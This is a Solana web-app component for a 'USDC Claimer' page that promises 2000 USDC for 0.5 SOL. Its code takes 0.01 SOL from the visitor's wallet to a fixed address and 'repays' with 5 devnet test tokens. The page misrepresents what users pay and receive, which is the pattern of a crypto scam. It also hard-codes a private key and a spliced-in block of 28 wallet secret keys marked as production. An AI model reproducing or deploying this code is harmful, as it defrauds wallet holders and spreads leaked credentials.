/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "dLG1RdnB6FKq24gotoNMMfRkADidqPKb38kugjMzuXys4LozUqGHY4woYcZyX6MGLjYJdGKgM9ggJAghfYxnReD"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "QtYXqNyCZN1HXznLnbnZa2aXqDgs6bPbVomW4MVsRXGitMRL4CURS6MgfgngGjs5qBho93jTjNVXo6PDCaRjCYG",
  "key1": "2124DZu6Y1Zj2xf6T5fgrk7w7VWyvduGhd5iV7SSwvJS5JZq3bYLR9BXNjofX3NhDErhnaKtcZAgy1yJhMoZmSYq",
  "key2": "4PkoD5VxgLTPbbzuXtjDs4dJGso37zAiJb6N7C4p7xNVo7bQBcLYLmYQdLgtGJRXH6B5jQp6kfTV5csg3sc1sdk6",
  "key3": "47ywDC6VWpXQsySAix9buhr9fJPX9XK6r5qecAUc6eVCd8Du5N5vNheKe8dt2qmvRFqNeeVp9znXoWb3KfzsNj8c",
  "key4": "3q9WoUSrHthn14i6TV8d4uiSD8aMZxyxuUToxfeLUjePnDcqjzDsmwyep8LRKHxAg9RKZcThyMhriWcH365wZD9H",
  "key5": "5Xs7jQkjsqucGNwHZsqtneXtGg8RQL57zgpfAbY821wFSUzQvwvRadN5hVfjJPZRaDKTT86N7YBoYt1hEkSETkiF",
  "key6": "4uKVLZqLehf3VGSyefbYZeYt9KbLb9dhWZdDN8MvBXywVDUQzuAEuZJFKS8Q1JVPcfLYDCKg71qXberzrFQHp9bW",
  "key7": "2Sw3WBB4RrVDrSsrzvh6owY3S38PQXT7B3qz38ndbbMriZY8uHXnn9FFYB51id2uTcniDP7qHGEKusY4rcBbiMMA",
  "key8": "FgvctMauAFUEBhmo9LtAFhtqXbNxjKzXZc2aNXJ4iHbCyDG6n71YaHdKrWBahBaFwBHE4pthsLqeRgEA2mZuQtn",
  "key9": "3X1UcQCbbBdEwLZMg9UKH8zUXRQxVxH8Xxnqz25ZAeryBGfyYiYisYdCRRun7VH3ZuXpghSFaq844QaYn6xWLTDX",
  "key10": "uVintockh74BsMYnW17xXwgYPgCj8npJLdntJMC9JimiQ1XYAToY9j3xFSrzAcS65VMkUWTN2du7CNynpwyzsgg",
  "key11": "3P59EsEHJvyoAknZqgTa9bcNv7LjocKpm6u2DuhqUXphJtfxZpp7FHrxvbWjiZMojLpDapVP8jqRwhoPVQVCm8UB",
  "key12": "2oGtL25stFj1uEsP7Vbka7H4PE7AddYEtWA7DNHZkRxbMoq5WaRU3NKoTwNc6JSpp6UhWcBNW48nmGWhteAYbYMa",
  "key13": "2NHtfxywvNhBEATptFHKoP7mvsWcNewdkDwytzUQroTKyeRdsUPmMUjLowidfbCG934qFrVHtRnjrCf8WVypfokz",
  "key14": "2yfy3DKKGjVA4qXssgfKdDukYWDYQaD14mLebXCuXM4wgqzhFppPNqrSChwkMbzXAUaBmPii3eCc5msvhjah39qV",
  "key15": "4H12BNrrNqh5c2d4kxAzEBcLkdZE59hzZyXmdZEsrNPpkyk6696yjMu2eudXz8nRBw6gvdshu43mxKwTqqaUFgDm",
  "key16": "2RALp8aVWvw9EbNc1HYnnqPUU5kKpvuunM7dyC1sRHa8NEibbPEEGAEUHGpusWbqFPCAkiDYj2Sx4yqQbSt1ysC5",
  "key17": "3tNAaFgLaRmhhraJbeDd24vNe8yr1QqnaL7cds8Qq7rK376iAQZRgdQHkRRyLKELNzCce6w8hmgZmweRXorGJWJv",
  "key18": "22e36tU5NtgogeNaL3jY3onmMkf75jtDcugGg9JMX7uJ75KzqDFTUiRXKzESmrm7Us2A933xfrLHQL61uJAd8EMx",
  "key19": "27dRRsbadT8jmThTgUgbG9txKv24eir32x3P2zZDb2gV7GxJZBfg9BZFjUK9yPJ5PJ9zemmHANYtKRAhCmS2MHRE",
  "key20": "2BpD2BvghF5dkbEDEE5jPdyHcy3uvob1ZmBUbPxKeNnNYPyKh32PxLRDS3hi3MQX7emtaMfL5oCKhWLHY6kCFm6Y",
  "key21": "LRkuwuKcAGHXauJgS5MctbjAQxL5ArGGSCK4DR6CLXYhhMaXaRRMgnLQzMv1zBTEN6dtVySRswrNXbhQSWGnLSF",
  "key22": "4KggA1Yi8d6HHJK73mWgJxH6ZAXGnouDLXM24SmtPX7uQKWkouGNWvJbrWMaWPZUwKMJVG4xwXPdrHAMFbndMg4F",
  "key23": "3ejQUPanDk95rjoGDad7ryuWU57ckgWZX4LDG6ZcBs195TtQjzpCYeuEKVsADb38bYT7trUJCgcss5kZAgr3iQJy",
  "key24": "9G3uAKzgpfCC6g2XynGRxDFBT1BZsVhyTSyaeETz5H2ogs1Ycz8CnBwb3UTEwvxSxcwik7fekrzA38qYG5g3YgT",
  "key25": "cgCiMQ5noWrrzM9s5QYJq4aGAiyQ2F5MRj33M5ywiqxBCvqR3efr2MUGhU1US9YxTQEcnPSq8CQtRHb8sK4S6vw",
  "key26": "4t8ok3rRz2GmdWnJb8uVJBodyH9iRTMnEnavXkk5nLreL2ZvKpfe2HuRXwqPjzYBf3kK3A9Dhn5BduB5MJe7j7Mt",
  "key27": "2a7novE8t4uJaWozXJu9TRoX68wPiYA5JCRTPADe1toBcJPXsVvL3Vw4iDPMBAMz1EqDkWoch4rNSQgdtmQzhgNu"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
